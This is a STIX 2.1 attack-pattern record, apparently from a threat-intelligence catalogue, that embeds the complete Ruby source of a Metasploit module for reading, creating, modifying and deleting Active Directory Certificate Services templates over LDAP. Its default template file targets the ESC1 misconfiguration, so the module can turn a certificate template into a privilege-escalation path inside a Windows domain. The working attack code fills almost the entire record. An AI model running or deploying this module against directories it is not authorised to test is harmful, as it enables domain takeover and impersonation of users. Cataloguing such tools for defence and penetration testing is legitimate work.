{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5610212f-638b-4a02-a3d4-6bebb1a42c10",
    "created": "2024-08-14T16:22:20.527534Z",
    "modified": "2024-08-14T16:22:20.527538Z",
    "name": "AD CS Certificate Template Management",
    "description": " This module can read, write, update, and delete AD CS certificate templates from a Active Directory Domain Controller.  The READ, UPDATE, and DELETE actions will write a copy of the certificate template to disk that can be restored using the CREATE or UPDATE actions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/ldap/ad_cs_cert_template.rb",
            "external_id": "ad_cs_cert_template.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/GhostPack/Certify"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ly4k/Certipy"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::LDAP\n  include Msf::Auxiliary::Report\n\n  IGNORED_ATTRIBUTES = [\n    'dn',\n    'distinguishedName',\n    'objectClass',\n    'cn',\n    'whenCreated',\n    'whenChanged',\n    'name',\n    'objectGUID',\n    'objectCategory',\n    'dSCorePropagationData',\n    'msPKI-Cert-Template-OID',\n    'uSNCreated',\n    'uSNChanged',\n    'displayName',\n    'instanceType',\n    'revision',\n    'msPKI-Template-Schema-Version',\n    'msPKI-Template-Minor-Revision',\n  ].freeze\n\n  # LDAP_SERVER_SD_FLAGS constant definition, taken from https://ldapwiki.com/wiki/LDAP_SERVER_SD_FLAGS_OID\n  LDAP_SERVER_SD_FLAGS_OID = '1.2.840.113556.1.4.801'.freeze\n  OWNER_SECURITY_INFORMATION = 0x1\n  GROUP_SECURITY_INFORMATION = 0x2\n  DACL_SECURITY_INFORMATION = 0x4\n  SACL_SECURITY_INFORMATION = 0x8\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'AD CS Certificate Template Management',\n        'Description' => %q{\n          This module can read, write, update, and delete AD CS certificate templates from a Active Directory Domain\n          Controller.\n\n          The READ, UPDATE, and DELETE actions will write a copy of the certificate template to disk that can be\n          restored using the CREATE or UPDATE actions.\n        },\n        'Author' => [\n          'Will Schroeder', # original idea/research\n          'Lee Christensen', # original idea/research\n          'Oliver Lyak', # certipy implementation\n          'Spencer McIntyre'\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/GhostPack/Certify' ],\n          [ 'URL', 'https://github.com/ly4k/Certipy' ]\n        ],\n        'License' => MSF_LICENSE,\n        'Actions' => [\n          ['CREATE', { 'Description' => 'Create the certificate template' }],\n          ['READ', { 'Description' => 'Read the certificate template' }],\n          ['UPDATE', { 'Description' => 'Modify the certificate template' }],\n          ['DELETE', { 'Description' => 'Delete the certificate template' }]\n        ],\n        'DefaultAction' => 'READ',\n        'Notes' => {\n          'Stability' => [],\n          'SideEffects' => [CONFIG_CHANGES],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),\n      OptString.new('CERT_TEMPLATE', [ true, 'The remote certificate template name', 'User' ]),\n      OptPath.new('TEMPLATE_FILE', [ false, 'Local template definition file', File.join(::Msf::Config.data_directory, 'auxiliary', 'admin', 'ldap', 'ad_cs_cert_template', 'esc1_template.yaml') ])\n    ])\n  end\n\n  def ldap_get(filter, attributes: [], base: nil, controls: [])\n    base ||= @base_dn\n    raw_obj = @ldap.search(base: base, filter: filter, attributes: attributes, controls: controls).first\n    validate_query_result!(@ldap.get_operation_result.table)\n    return nil unless raw_obj\n\n    obj = {}\n    raw_obj.attribute_names.each do |attr|\n      obj[attr.to_s] = raw_obj[attr].map(&:to_s)\n    end\n\n    obj\n  end\n\n  def run\n    ldap_connect do |ldap|\n      validate_bind_success!(ldap)\n\n      if (@base_dn = datastore['BASE_DN'])\n        print_status(\"User-specified base DN: #{@base_dn}\")\n      else\n        print_status('Discovering base DN automatically')\n\n        unless (@base_dn = discover_base_dn(ldap))\n          fail_with(Failure::NotFound, \"Couldn't discover base DN!\")\n        end\n      end\n      @ldap = ldap\n\n      send(\"action_#{action.name.downcase}\")\n      print_good('The operation completed successfully!')\n    end\n  rescue Rex::ConnectionError => e\n    print_error(\"#{e.class}: #{e.message}\")\n  rescue Net::LDAP::Error => e\n    print_error(\"#{e.class}: #{e.message}\")\n  end\n\n  def get_certificate_template\n    obj = ldap_get(\n      \"(&(cn=#{datastore['CERT_TEMPLATE']})(objectClass=pkicertificatetemplate))\",\n      base: \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,#{@base_dn}\",\n      controls: [ms_security_descriptor_control(DACL_SECURITY_INFORMATION)]\n    )\n    fail_with(Failure::NotFound, 'The specified template was not found.') unless obj\n\n    print_good(\"Read certificate template data for: #{obj['dn'].first}\")\n    stored = store_loot(\n      'windows.ad.cs.template',\n      'application/json',\n      rhost,\n      dump_to_json(obj),\n      \"#{datastore['CERT_TEMPLATE'].downcase.gsub(' ', '_')}_template.json\",\n      \"#{datastore['CERT_TEMPLATE']} Certificate Template\"\n    )\n    print_status(\"Certificate template data written to: #{stored}\")\n    obj\n  end\n\n  def get_domain_sid\n    return @domain_sid if @domain_sid.present?\n\n    obj = ldap_get('(objectClass=domain)', attributes: %w[name objectSID])\n    fail_with(Failure::NotFound, 'The domain SID was not found!') unless obj&.fetch('objectsid', nil)\n\n    Rex::Proto::MsDtyp::MsDtypSid.read(obj['objectsid'].first)\n  end\n\n  def dump_to_json(template)\n    json = {}\n\n    template.each do |attribute, values|\n      next if IGNORED_ATTRIBUTES.any? { |word| word.casecmp?(attribute) }\n\n      json[attribute] = values.map do |value|\n        value.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join\n      end\n    end\n\n    json.to_json\n  end\n\n  def load_from_json(json)\n    template = {}\n\n    JSON.parse(json).each do |attribute, values|\n      next if IGNORED_ATTRIBUTES.any? { |word| word.casecmp?(attribute) }\n\n      template[attribute] = values.map do |value|\n        value.scan(/../).map { |x| x.hex.chr }.join\n      end\n    end\n\n    template\n  end\n\n  def load_from_yaml(yaml)\n    template = {}\n\n    YAML.safe_load(yaml).each do |attribute, value|\n      next if IGNORED_ATTRIBUTES.any? { |word| word.casecmp?(attribute) }\n\n      if attribute.casecmp?('nTSecurityDescriptor')\n        unless value.is_a?(String)\n          fail_with(Failure::BadConfig, 'The local template file specified an invalid nTSecurityDescriptor.')\n        end\n\n        # if the string only contains printable characters, treat it as SDDL\n        if value !~ /[^[:print:]]/\n          begin\n            vprint_status(\"Parsing SDDL text: #{value}\")\n            descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.from_sddl_text(value, domain_sid: get_domain_sid)\n          rescue RuntimeError => e\n            fail_with(Failure::BadConfig, e.message)\n          end\n\n          value = descriptor.to_binary_s\n        elsif !value.start_with?(\"\\x01\".b)\n          fail_with(Failure::BadConfig, 'The local template file specified an invalid nTSecurityDescriptor.')\n        end\n      end\n\n      value = [ value ] unless value.is_a?(Array)\n      template[attribute] = value.map(&:to_s)\n    end\n\n    template\n  end\n\n  def load_local_template\n    if datastore['TEMPLATE_FILE'].blank?\n      fail_with(Failure::BadConfig, 'No local template file was specified in TEMPLATE_FILE.')\n    end\n\n    unless File.readable?(datastore['TEMPLATE_FILE']) && File.file?(datastore['TEMPLATE_FILE'])\n      fail_with(Failure::BadConfig, 'TEMPLATE_FILE must be a readable file.')\n    end\n\n    file_data = File.read(datastore['TEMPLATE_FILE'])\n    if datastore['TEMPLATE_FILE'].downcase.end_with?('.json')\n      load_from_json(file_data)\n    elsif datastore['TEMPLATE_FILE'].downcase.end_with?('.yaml') || datastore['TEMPLATE_FILE'].downcase.end_with?('.yml')\n      load_from_yaml(file_data)\n    else\n      fail_with(Failure::BadConfig, 'TEMPLATE_FILE must be a JSON or YAML file.')\n    end\n  end\n\n  def ms_security_descriptor_control(flags)\n    control_values = [flags].map(&:to_ber).to_ber_sequence.to_s.to_ber\n    [LDAP_SERVER_SD_FLAGS_OID.to_ber, control_values].to_ber_sequence\n  end\n\n  def action_create\n    dn = \"CN=#{datastore['CERT_TEMPLATE']},\"\n    dn << 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,'\n    dn << @base_dn\n\n    # defaults to create one from the builtin SubCA template\n    # the nTSecurityDescriptor and objectGUID fields will be set automatically so they can be omitted\n    attributes = {\n      'objectclass' => ['top', 'pKICertificateTemplate'],\n      'cn' => datastore['CERT_TEMPLATE'],\n      'instancetype' => '4',\n      'displayname' => datastore['CERT_TEMPLATE'],\n      'usncreated' => '16437',\n      'usnchanged' => '16437',\n      'showinadvancedviewonly' => 'TRUE',\n      'name' => datastore['CERT_TEMPLATE'],\n      'flags' => '66257',\n      'revision' => '5',\n      'objectcategory' => \"CN=PKI-Certificate-Template,CN=Schema,CN=Configuration,#{@base_dn}\",\n      'pkidefaultkeyspec' => '2',\n      'pkikeyusage' => \"\\x86\\x00\".b,\n      'pkimaxissuingdepth' => '-1',\n      'pkicriticalextensions' => ['2.5.29.15', '2.5.29.19'],\n      'pkiexpirationperiod' => \"\\x00@\\x1E\\xA4\\xE8e\\xFA\\xFF\".b,\n      'pkioverlapperiod' => \"\\x00\\x80\\xA6\\n\\xFF\\xDE\\xFF\\xFF\".b,\n      'pkidefaultcsps' => '1,Microsoft Enhanced Cryptographic Provider v1.0',\n      'dscorepropagationdata' => '16010101000000.0Z',\n      'mspki-ra-signature' => '0',\n      'mspki-enrollment-flag' => '0',\n      'mspki-private-key-flag' => '16',\n      'mspki-certificate-name-flag' => '1',\n      'mspki-minimal-key-size' => '2048',\n      'mspki-template-schema-version' => '1',\n      'mspki-template-minor-revision' => '1',\n      'mspki-cert-template-oid' => '1.3.6.1.4.1.311.21.8.9238385.12403672.2312086.11590436.9092015.147.1.18'\n    }\n\n    unless datastore['TEMPLATE_FILE'].blank?\n      load_local_template.each do |key, value|\n        key = key.downcase\n        next if %w[dn distinguishedname objectguid].include?(key)\n\n        attributes[key.downcase] = value\n      end\n    end\n\n    # can not contain dn, distinguishedname, or objectguid\n    print_status(\"Creating: #{dn}\")\n    @ldap.add(dn: dn, attributes: attributes)\n    validate_query_result!(@ldap.get_operation_result.table)\n  end\n\n  def action_delete\n    obj = get_certificate_template\n\n    @ldap.delete(dn: obj['dn'].first)\n    validate_query_result!(@ldap.get_operation_result.table)\n  end\n\n  def action_read\n    obj = get_certificate_template\n\n    print_status('Certificate Template:')\n    print_status(\"  distinguishedName: #{obj['distinguishedname'].first}\")\n    print_status(\"  displayName:       #{obj['displayname'].first}\") if obj['displayname'].first.present?\n    if obj['objectguid'].first.present?\n      object_guid = Rex::Proto::MsDtyp::MsDtypGuid.read(obj['objectguid'].first)\n      print_status(\"  objectGUID:        #{object_guid}\")\n    end\n\n    mspki_flag = obj['mspki-certificate-name-flag'].first\n    if mspki_flag.present?\n      mspki_flag = [obj['mspki-certificate-name-flag'].first.to_i].pack('l').unpack1('L')\n      print_status(\"  msPKI-Certificate-Name-Flag: 0x#{mspki_flag.to_s(16).rjust(8, '0')}\")\n      %w[\n        CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\n        CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME\n        CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS\n        CT_FLAG_SUBJECT_ALT_REQUIRE_SPN\n        CT_FLAG_SUBJECT_ALT_REQUIRE_DIRECTORY_GUID\n        CT_FLAG_SUBJECT_ALT_REQUIRE_UPN\n        CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL\n        CT_FLAG_SUBJECT_ALT_REQUIRE_DNS\n        CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN\n        CT_FLAG_SUBJECT_REQUIRE_EMAIL\n        CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME\n        CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH\n        CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME\n      ].each do |flag_name|\n        if mspki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0\n          print_status(\"    * #{flag_name}\")\n        end\n      end\n    end\n\n    mspki_flag = obj['mspki-enrollment-flag'].first\n    if mspki_flag.present?\n      mspki_flag = [obj['mspki-enrollment-flag'].first.to_i].pack('l').unpack1('L')\n      print_status(\"  msPKI-Enrollment-Flag: 0x#{mspki_flag.to_s(16).rjust(8, '0')}\")\n      %w[\n        CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS\n        CT_FLAG_PEND_ALL_REQUESTS\n        CT_FLAG_PUBLISH_TO_KRA_CONTAINER\n        CT_FLAG_PUBLISH_TO_DS\n        CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE\n        CT_FLAG_AUTO_ENROLLMENT\n        CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT\n        CT_FLAG_USER_INTERACTION_REQUIRED\n        CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE\n        CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF\n        CT_FLAG_ADD_OCSP_NOCHECK\n        CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL\n        CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS\n        CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS\n        CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT\n        CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST\n        CT_FLAG_SKIP_AUTO_RENEWAL\n      ].each do |flag_name|\n        if mspki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0\n          print_status(\"    * #{flag_name}\")\n        end\n      end\n    end\n\n    mspki_flag = obj['mspki-private-key-flag'].first\n    if mspki_flag.present?\n      mspki_flag = [obj['mspki-private-key-flag'].first.to_i].pack('l').unpack1('L')\n      print_status(\"  msPKI-Private-Key-Flag: 0x#{mspki_flag.to_s(16).rjust(8, '0')}\")\n      %w[\n        CT_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL\n        CT_FLAG_EXPORTABLE_KEY\n        CT_FLAG_STRONG_KEY_PROTECTION_REQUIRED\n        CT_FLAG_REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM\n        CT_FLAG_REQUIRE_SAME_KEY_RENEWAL\n        CT_FLAG_USE_LEGACY_PROVIDER\n        CT_FLAG_ATTEST_NONE\n        CT_FLAG_ATTEST_REQUIRED\n        CT_FLAG_ATTEST_PREFERRED\n        CT_FLAG_ATTESTATION_WITHOUT_POLICY\n        CT_FLAG_EK_TRUST_ON_USE\n        CT_FLAG_EK_VALIDATE_CERT\n        CT_FLAG_EK_VALIDATE_KEY\n        CT_FLAG_HELLO_LOGON_KEY\n      ].each do |flag_name|\n        if mspki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0\n          print_status(\"    * #{flag_name}\")\n        end\n      end\n    end\n\n    mspki_flag = obj['mspki-ra-signature'].first\n    if mspki_flag.present?\n      mspki_flag = [obj['mspki-ra-signature'].first.to_i].pack('l').unpack1('L')\n      print_status(\"  msPKI-RA-Signature: 0x#{mspki_flag.to_s(16).rjust(8, '0')}\")\n    end\n\n    if obj['pkiextendedkeyusage'].present?\n      print_status('  pKIExtendedKeyUsage:')\n      obj['pkiextendedkeyusage'].each do |value|\n        print_status(\"    * #{value}\")\n      end\n    end\n  end\n\n  def action_update\n    obj = get_certificate_template\n    new_configuration = load_local_template\n\n    operations = []\n    obj.each do |attribute, value|\n      next if IGNORED_ATTRIBUTES.any? { |word| word.casecmp?(attribute) }\n\n      if new_configuration.keys.any? { |word| word.casecmp?(attribute) }\n        new_value = new_configuration.find { |k, _| k.casecmp?(attribute) }.last\n        unless value.tally == new_value.tally\n          operations << [:replace, attribute, new_value]\n        end\n      else\n        operations << [:delete, attribute, nil]\n      end\n    end\n\n    new_configuration.each_key do |attribute|\n      next if IGNORED_ATTRIBUTES.any? { |word| word.casecmp?(attribute) }\n      next if obj.keys.any? { |i| i.casecmp?(attribute) }\n\n      operations << [:add, attribute, new_configuration[attribute]]\n    end\n\n    if operations.empty?\n      print_good('There are no changes to be made.')\n      return\n    end\n\n    @ldap.modify(dn: obj['dn'].first, operations: operations, controls: [ms_security_descriptor_control(DACL_SECURITY_INFORMATION)])\n    validate_query_result!(@ldap.get_operation_result.table)\n  end\nend\n"
}